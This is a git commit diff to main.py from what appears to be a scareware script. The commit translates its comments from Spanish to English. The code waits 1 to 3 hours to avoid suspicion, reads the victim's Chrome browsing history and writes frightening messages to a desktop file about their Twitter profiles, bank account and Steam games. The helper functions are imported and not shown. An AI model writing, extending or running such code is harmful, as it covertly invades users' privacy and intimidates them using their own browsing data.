c50edf2b8006009825eb75516a86b2bca49fac7c
utapa <112322786+utapa@users.noreply.github.com>
2023-12-20 18:13:09 -0300

    Update main.py

--- main.py
+++ main.py
@@ -2,22 +2,23 @@ from functions import *
 
 HACKER_FILE_NAME = "PARA TI.txt"
 
-
-
 def main():
-    # Esperaremos entre 1 y 3 horas para no levantar sospechas
+    # Introduce a delay of 1 to 3 hours to avoid suspicion
     delay_action()
-    # Calculamos la ruta del usuario de Windows
+
+    # Get the user's Windows path
     user_path = get_user_path()
-    # Recogemos su historial de google chrome, cuando sea posible...
+
+    # Retrieve Google Chrome history, when possible
     chrome_history = get_chrome_history(user_path)
-    # Creamos un archivo en el escritorio
+
+    # Create a file on the desktop
     hacker_file = create_hacker_file(user_path)
-    # Escribiendo mensajes de miedo
+
+    # Write scary messages
     check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
     check_bank_account(hacker_file, chrome_history)
     check_steam_games(hacker_file)
-
 
 if __name__ == "__main__":
     main()
